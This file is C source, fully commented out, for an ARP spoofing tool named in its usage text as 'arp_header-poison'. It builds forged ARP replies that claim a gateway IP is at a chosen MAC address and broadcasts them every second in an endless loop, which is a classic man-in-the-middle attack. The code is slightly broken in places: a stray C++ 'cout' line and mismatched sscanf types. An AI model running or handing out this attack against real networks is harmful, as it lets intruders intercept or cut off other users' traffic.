//#include <stdio.h>
//#include <stdlib.h>
//#include <string.h>
//#include <unistd.h>
//#include <arpa/inet.h>
//#include <net/if.h>
//#include <sys/socket.h>
//#include <netpacket/packet.h>
//#include <net/ethernet.h>
//#include <netinet/if_ether.h>
//#include <signal.h>
//
//#define IP4LEN 4
//
//int
//main(int argc, char **argv) {
//
//
////    if (argc < 4) {
////        puts("usage:\t./arp_header-poison <INTERFACE> <gateway ip> <mac addr>");
////        puts("ex:\t./arp_header-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff");
////        exit(1);
////    }
//
//    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
//    if (sock < 0)
//        perror("socket"), exit(1);
//
//    char *INTERFACE = "enp0s3";
//    char *ip = "10.0.0.1";
//    char *mac = "aa:bb:cc:dd:ee:ff";
//
//#define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)
//    char packet[PKTLEN];
//    memset(packet, 0, PKTLEN);
//
//    struct ether_header *eth_header = (struct ether_header *) packet; // ethernet header
//    struct ether_arp *arp_header = (struct ether_arp *) (packet + sizeof(struct ether_header)); // arp_header header
//
//
//    // setup arp header
//    sscanf(mac, "%x:%x:%x:%x:%x:%x", (unsigned int *) &arp_header->arp_sha[0],
//           (unsigned int *) &arp_header->arp_sha[1],
//           (unsigned int *) &arp_header->arp_sha[2],
//           (unsigned int *) &arp_header->arp_sha[3],
//           (unsigned int *) &arp_header->arp_sha[4],
//           (unsigned int *) &arp_header->arp_sha[5]);
//
//    sscanf(ip, "%d.%d.%d.%d", (int *) &arp_header->arp_spa[0],
//           (int *) &arp_header->arp_spa[1],
//           (int *) &arp_header->arp_spa[2],
//           (int *) &arp_header->arp_spa[3]);
//
//
//    // setup ethernet header
//    memset(eth_header->ether_dhost, 0xff, ETH_ALEN); // send to broadcast
//    memcpy(eth_header->ether_shost, arp_header->arp_sha, ETH_ALEN);
//    eth_header->ether_type = htons(ETH_P_ARP); // ethertype: arp
//
//
//    // setup arp header
//    arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // first arp addr type: mac
//    arp_header->ea_hdr.ar_pro = htons(ETH_P_IP); // first arp addr type: ip
//    arp_header->ea_hdr.ar_hln = ETH_ALEN; // len of mac addr
//    arp_header->ea_hdr.ar_pln = IP4LEN; // len of ip addr
//    arp_header->ea_hdr.ar_op = htons(ARPOP_REPLY); // type of arp (forged reply)
//    memset(arp_header->arp_tha, 0xff, ETH_ALEN);
//    memset(arp_header->arp_tpa, 0x00, IP4LEN);
//
//
//    struct sockaddr_ll interface_addr;
//    memset(&interface_addr, 0, sizeof(interface_addr));
//    interface_addr.sll_ifindex = if_nametoindex(INTERFACE);
//    interface_addr.sll_family = AF_PACKET;
//    memcpy(interface_addr.sll_addr, arp_header->arp_sha, ETH_ALEN);
//    interface_addr.sll_halen = htons(ETH_ALEN);
//
//    while (1) {
//        printf("%s: %s is at %s\n", INTERFACE, ip, mac);
//        cout << "sent" << endl;
//        sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &interface_addr, sizeof(interface_addr));
//        sleep(1);
//    }
//    return 0;
//}